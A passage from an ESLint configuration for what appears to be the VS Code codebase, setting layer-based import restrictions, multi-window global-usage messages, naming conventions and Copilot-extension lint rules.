					'message': 'Use <targetWindow>.opener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'origin',
					'message': 'Use <targetWindow>.origin to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screen',
					'message': 'Use <targetWindow>.screen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenLeft',
					'message': 'Use <targetWindow>.screenLeft to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenTop',
					'message': 'Use <targetWindow>.screenTop to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenX',
					'message': 'Use <targetWindow>.screenX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenY',
					'message': 'Use <targetWindow>.screenY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollX',
					'message': 'Use <targetWindow>.scrollX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollY',
					'message': 'Use <targetWindow>.scrollY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'top',
					'message': 'Use <targetWindow>.top to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'visualViewport',
					'message': 'Use <targetWindow>.visualViewport to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				}
			]
		}
	},
	// electron-utility layer
	{
		files: [
			'src/**/electron-utility/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'paths': [
						{
							'name': 'electron',
							'allowImportNames': [
								'net',
								'system-preferences',
							],
							'message': 'Only net and system-preferences are allowed to be imported from electron'
						}
					]
				}
			]
		}
	},
	{
		files: [
			'src/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['dompurify*'],
							'message': 'Use domSanitize instead of dompurify directly'
						},
					]
				}
			],
			'local/code-import-patterns': [
				'warn',
				{
					// imports that are allowed in all files of layers:
					// - browser
					// - electron-browser
					'when': 'hasBrowser',
					'allow': []
				},
				{
					// imports that are allowed in all files of layers:
					// - node
					// - electron-utility
					// - electron-main
					'when': 'hasNode',
					'allow': [
						'@github/copilot-sdk',
						'@microsoft/dev-tunnels-contracts',
						'@microsoft/dev-tunnels-management',
						'@parcel/watcher',
						'@vscode/sqlite3',
						'@vscode/vscode-languagedetection',
						'@vscode/ripgrep',
						'@vscode/iconv-lite-umd',
						'@vscode/native-watchdog',
						'@vscode/policy-watcher',
						'@vscode/proxy-agent',
						'@vscode/spdlog',
						'@vscode/windows-process-tree',
						'assert',
						'child_process',
						'console',
						'cookie',
						'crypto',
						'dns',
						'events',
						'fs',
						'fs/promises',
						'http',
						'https',
						'inspector',
						'minimist',
						'node:module',
						'native-keymap',
						'net',
						'node-pty',
						'os',
						// 'path', NOT allowed: use src/vs/base/common/path.ts instead
						'perf_hooks',
						'readline',
						'ssh2',
						'stream',
						'string_decoder',
						'tas-client',
						'tls',
						'undici',
						'undici-types',
						'url',
						'util',
						'vscode-regexpp',
						'vscode-textmate',
						'worker_threads',
						'ws',
						'@xterm/addon-clipboard',
						'@xterm/addon-image',
						'@xterm/addon-ligatures',
						'@xterm/addon-search',
						'@xterm/addon-serialize',
						'@xterm/addon-unicode11',
						'@xterm/addon-webgl',
						'@xterm/headless',
						'@xterm/xterm',
						'yauzl',
						'yazl',
						'zlib',
						'chrome-remote-interface'
					]
				},
				{
					// imports that are allowed in all files of layers:
					// - electron-utility
					// - electron-main
					'when': 'hasElectron',
					'allow': [
						'electron'
					]
				},
				{
					// imports that are allowed in all /test/ files
					'when': 'test',
					'allow': [
						'assert',
						'sinon',
						'sinon-test'
					]
				},
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				// !!! Do not relax these rules !!!
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				//
				// A path ending in /~ has a special meaning. It indicates a template position
				// which will be substituted with one or more layers.
				//
				// When /~ is used in the target, the rule will be expanded to 14 distinct rules.
				// e.g. 'src/vs/base/~' will be expanded to:
				//  - src/vs/base/common
				//  - src/vs/base/worker
				//  - src/vs/base/browser
				//  - src/vs/base/electron-browser
				//  - src/vs/base/node
				//  - src/vs/base/electron-main
				//  - src/vs/base/test/common
				//  - src/vs/base/test/worker
				//  - src/vs/base/test/browser
				//  - src/vs/base/test/electron-browser
				//  - src/vs/base/test/node
				//  - src/vs/base/test/electron-main
				//
				// When /~ is used in the restrictions, it will be replaced with the correct
				// layers that can be used e.g. 'src/vs/base/electron-browser' will be able
				// to import '{common,browser,electron-sanbox}', etc.
				//
				// It is possible to use /~ in the restrictions property even without using it in
				// the target property by adding a layer property.
				{
					'target': 'src/vs/base/~',
					'restrictions': [
						'vs/base/~'
					]
				},
				{
					'target': 'src/vs/base/parts/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~'
					]
				},
				{
					'target': 'src/vs/platform/agentHost/node/diffWorkerMain.ts',
					'layer': 'node',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/common/diff/**', // diffing logic used by the agent host
					]
				},
				{
					'target': 'src/vs/platform/agentHost/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // used by agentHost for command auto-approval
						'@vscode/copilot-api', // used by agentHost for Copilot API requests
						'@anthropic-ai/sdk', // used by agentHost for Anthropic API requests
						'@anthropic-ai/claude-agent-sdk' // used by agentHost for Claude Agent SDK session enumeration / queries
					]
				},
				{
					'target': 'src/vs/platform/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm' // used by agentHost for command auto-approval
					]
				},
				{
					'target': 'src/vs/editor/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'@vscode/tree-sitter-wasm' // node module allowed even in /common/
					]
				},
				{
					'target': 'src/vs/editor/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/standalone/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'@vscode/tree-sitter-wasm' // type import
					]
				},
				{
					'target': 'src/vs/editor/editor.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/editor.worker.start.ts',
					'layer': 'worker',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~'
					]
				},
				{
					'target': 'src/vs/editor/{editor.api.ts,editor.main.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'vs/editor/*'
					]
				},
				{
					'target': 'src/vs/workbench/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'assert',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						} // TODO@layers
					]
				},
				{
					'target': 'src/vs/workbench/api/~',
					'restrictions': [
						'vscode',
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/api/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/workbench/contrib/terminal/terminalContribChatExports*',
						'vs/workbench/contrib/terminal/terminalContribExports*',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminalContrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						// Only allow terminalContrib to import from itself, this works because
						// terminalContrib is one extra folder deep
						'vs/workbench/contrib/terminalContrib/*/~',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						}, // node module allowed even in /browser/
						'@xterm/headless' // node module allowed even in /common/ and /browser/
					]
				},
				{
					'target': 'src/vs/code/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/code/~',
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.internal.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/~'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/services/*/~'
						}
					]
				},
				{
					'target': 'src/vs/sessions/electron-browser/sessions.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/sessions.desktop.main.js'
					]
				},
				{
					'target': 'src/vs/server/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/server/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminal.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/**'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribChatExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/platform/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
						'vs/sessions/common/theme.js' // side-effect import for color registry
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.web.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/amdX.ts',
					'restrictions': [
						'vs/base/common/*'
					]
				},
				{
					'target': 'src/vs/{monaco.d.ts,nls.ts}',
					'restrictions': []
				},
				{
					'target': 'src/vscode-dts/**',
					'restrictions': []
				},
				{
					'target': 'src/vs/nls.ts',
					'restrictions': [
						'vs/*'
					]
				},
				{
					'target': 'src/{bootstrap-cli.ts,bootstrap-esm.ts,bootstrap-fork.ts,bootstrap-import.ts,bootstrap-meta.ts,bootstrap-node.ts,bootstrap-server.ts,cli.ts,main.ts,server-cli.ts,server-main.ts}',
					'restrictions': [
						'vs/**/common/*',
						'vs/**/node/*',
						'vs/nls.js',
						'src/*.js',
						'*' // node.js
					]
				},
				{
					'target': 'src/vs/sessions/sessions.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
					]
				},
				{
					'target': 'src/vs/sessions/sessions.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/sessions.web.test.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/{web.test.ts,web.test.factory.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/services/*/~',
					]
				},
				{
					'target': 'src/vs/sessions/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/workbench/contrib/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
			]
		}
	},
	{
		files: [
			'test/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-import-patterns': [
				'warn',
				{
					'target': 'test/smoke/**',
					'restrictions': [
						'test/automation',
						'test/smoke/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/sanity/**',
					'restrictions': [
						'test/sanity/**',
						'*' // node modules
					]
				},
				{
					'target': 'test/automation/**',
					'restrictions': [
						'test/automation/**',
						'@vscode/*',
						'@parcel/*',
						'playwright-core/**',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/integration/**',
					'restrictions': [
						'test/integration/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/monaco/**',
					'restrictions': [
						'test/monaco/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/mcp/**',
					'restrictions': [
						'test/automation',
						'test/mcp/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'@modelcontextprotocol/sdk/**/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/componentFixtures/playwright/**',
					'restrictions': [
						'test/componentFixtures/playwright/**',
						'@playwright/*',
						'*' // node modules
					]
				}
			]
		}
	},
	{
		files: [
			'src/vs/workbench/contrib/notebook/browser/view/renderers/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-runtime-import': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'**/*'
					]
				}
			],
			'local/code-limited-top-functions': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'webviewPreloads',
						'preloadsScriptStr'
					]
				}
			]
		}
	},
	// Terminal
	{
		files: [
			'src/vs/workbench/contrib/terminal/**/*.ts',
			'src/vs/workbench/contrib/terminalContrib/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'@typescript-eslint/naming-convention': [
				'warn',
				// variableLike
				{ 'selector': 'variable', 'format': ['camelCase', 'UPPER_CASE', 'PascalCase'] },
				{ 'selector': 'variable', 'filter': '^I.+Service$', 'format': ['PascalCase'], 'prefix': ['I'] },
				// memberLike
				{ 'selector': 'memberLike', 'modifiers': ['private'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'memberLike', 'modifiers': ['protected'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'enumMember', 'format': ['PascalCase'] },
				// memberLike - Allow enum-like objects to use UPPER_CASE
				{ 'selector': 'method', 'modifiers': ['public'], 'format': ['camelCase', 'UPPER_CASE'] },
				// typeLike
				{ 'selector': 'typeLike', 'format': ['PascalCase'] },
				{ 'selector': 'interface', 'format': ['PascalCase'] }
			],
			'comma-dangle': ['warn', 'only-multiline']
		}
	},
	// Ban dynamic require() and import() calls in extensions to ensure tree-shaking works
	{
		files: [
			'extensions/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/**/*.test.ts',
			'extensions/copilot/**/*',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `CallExpression[callee.name='require'][arguments.0.type!='Literal']`,
					'message': 'Use static imports instead of dynamic require() calls to enable tree-shaking.'
				},
				{
					'selector': `ImportExpression[source.type!='Literal']`,
					'message': 'Use static imports instead of dynamic import() calls to enable tree-shaking.'
				},
			],
		}
	},
	// markdown-language-features
	{
		files: [
			'extensions/markdown-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					selector: ':matches(PropertyDefinition, TSParameterProperty, MethodDefinition[key.name!="constructor"])[accessibility="private"]',
					message: 'Use #private instead',
				},
			],
		}
	},
	// Additional extension strictness rules
	{
		files: [
			'extensions/markdown-language-features/src/**/*.ts',
			'extensions/markdown-language-features/notebook/**/*.ts',
			'extensions/markdown-language-features/preview-src/**/*.ts',
			'extensions/mermaid-chat-features/chat-webview-src/**/*.ts',
			'extensions/mermaid-chat-features/src/**/*.ts',
			'extensions/media-preview/src/**/*.ts',
			'extensions/simple-browser/**/*.ts',
			'extensions/typescript-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
			parserOptions: {
				project: [
					// Markdown
					'extensions/markdown-language-features/tsconfig.json',
					'extensions/markdown-language-features/notebook/tsconfig.json',
					'extensions/markdown-language-features/preview-src/tsconfig.json',

					// Media preview
					'extensions/media-preview/tsconfig.json',

					// Media preview
					'extensions/simple-browser/tsconfig.json',
					'extensions/simple-browser/preview-src/tsconfig.json',

					// Mermaid chat features
					'extensions/mermaid-chat-features/tsconfig.json',
					'extensions/mermaid-chat-features/chat-webview-src/tsconfig.json',

					// TypeScript
					'extensions/typescript-language-features/tsconfig.json',
					'extensions/typescript-language-features/web/tsconfig.json',
				],
			}
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/prefer-optional-chain': 'warn',
			'@typescript-eslint/prefer-readonly': 'warn',
			'@typescript-eslint/consistent-generic-constructors': ['warn', 'constructor'],
		}
	},
	// copilot extension - main sources
	{
		files: [
			'extensions/copilot/src/**/*.{ts,tsx}',
			'extensions/copilot/test/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/copilot/**/.esbuild.ts',
			'extensions/copilot/src/extension/completions-core/vscode-node/bridge/src/completionsTelemetryServiceBridge.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'import': pluginImport,
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-no-any-casts': 'off',
			'local/code-no-deep-import-of-internal': 'off',
			'no-restricted-imports': [
				'warn',
				// node: builtins
				...builtinModules,
				// node: dependencies
				'@humanwhocodes/gitignore-to-minimatch',
				'@vscode/extension-telemetry',
				'applicationinsights',
				'ignore',
				'isbinaryfile',
				'minimatch',
				'source-map-support',
				'vscode-tas-client',
				'web-tree-sitter'
			],
			'import/no-restricted-paths': [
				'warn',
				{
					zones: [
						{
							target: '**/common/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode/**',
							from: [
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/node/**',
							from: [
								'**/vscode/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-node/**',
							from: [
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/worker/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-worker/**',
							from: [
								'**/node/**',
								'**/vscode-node/**'
							]
						},
						{
							target: './extensions/copilot/src/',
							from: './extensions/copilot/test/'
						},
						{
							target: './extensions/copilot/src/shared-fetch-utils',
							from: ['./extensions/copilot/src/extension', './extensions/copilot/src/platform', './extensions/copilot/src/util', './extensions/copilot/src/lib']
						},
						{
							target: './extensions/copilot/src/util',
							from: ['./extensions/copilot/src/platform', './extensions/copilot/src/extension']
						},
						{
							target: './extensions/copilot/src/platform',
							from: ['./extensions/copilot/src/extension']
						},
						{
							target: ['./extensions/copilot/test', '!./extensions/copilot/test/base/extHostContext/*.ts'],
							from: ['**/vscode-node/**', '**/vscode-worker/**']
						},
						{
							target: 'extensions/copilot/src/!(lib)/**',
							from: './extensions/copilot/src/lib'
						}
					]
				}
			],
			'copilot-local/no-instanceof-uri': ['warn'],
			'copilot-local/no-test-imports': ['warn'],
			'copilot-local/no-runtime-import': [
				'warn',
				{
					test: ['vscode'],
					'src/**/common/**/*': ['vscode'],
					'src/**/node/**/*': ['vscode']
				}
			],
			'copilot-local/no-funny-filename': ['warn'],
			'copilot-local/no-bad-gdpr-comment': ['warn'],
			'copilot-local/no-gdpr-event-name-mismatch': ['warn'],
			'copilot-local/no-unlayered-files': ['warn'],
			'copilot-local/no-restricted-copilot-pr-string': [
				'warn',
				{
					className: 'GitHubPullRequestProviders',
					string: 'Generate with Copilot'
				}
			],
			'copilot-local/no-nls-localize': ['warn'],
		}
	},
	// copilot extension - allow node imports in node layer
	{
		files: [
			'extensions/copilot/**/{vscode-node,node}/**/*.ts',
			'extensions/copilot/**/{vscode-node,node}/**/*.tsx',
		],
		rules: {
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - override files (tests, build, etc.)
	{
		files: [
			'extensions/copilot/test/**',
			'extensions/copilot/src/vscodeTypes.ts',
			'extensions/copilot/script/**',
			'extensions/copilot/src/extension/*.d.ts',
			'extensions/copilot/build/**',
		],
		rules: {
			'copilot-local/no-unlayered-files': 'off',
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - TSX linebreak rule
	{
		files: [
			'extensions/copilot/src/extension/**/*.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'copilot-local/no-missing-linebreak': 'warn'
		}
	},
	// copilot extension - test-only rule
	{
		files: [
			'extensions/copilot/**/*.test.ts',
			'extensions/copilot/**/*.test.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
